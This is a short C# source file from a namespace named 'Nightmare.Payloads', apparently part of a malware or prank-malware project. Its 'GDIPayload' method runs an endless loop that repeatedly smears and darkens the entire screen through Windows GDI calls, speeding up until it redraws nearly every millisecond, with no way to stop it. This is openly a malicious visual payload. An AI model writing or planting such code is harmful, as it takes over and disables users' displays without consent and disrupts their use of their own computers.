using System;
using System.Threading;
using System.Windows.Forms;

namespace Nightmare.Payloads
{
    public class Gdi // Graphics Device Interface
    {
        public void GDIPayload()
        {
            int count = 1000;
            while (true)
            {
                Random rand;
                rand = new Random();
                int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
                IntPtr hdc = DLLImport.GetDC(IntPtr.Zero);
                DLLImport.StretchBlt(hdc, (rand.Next(2) == 1) ? -1 : 1, (rand.Next(2) == 1) ? -1 : 1, x, y, hdc, 0, 0,
                    x, y, DLLImport.TernaryRasterOperations.SRCAND);
                DLLImport.DeleteDC(hdc);
                if (count != 10)
                    Thread.Sleep(count -= 10);
                else
                    Thread.Sleep(1);
            }
        }
    }
}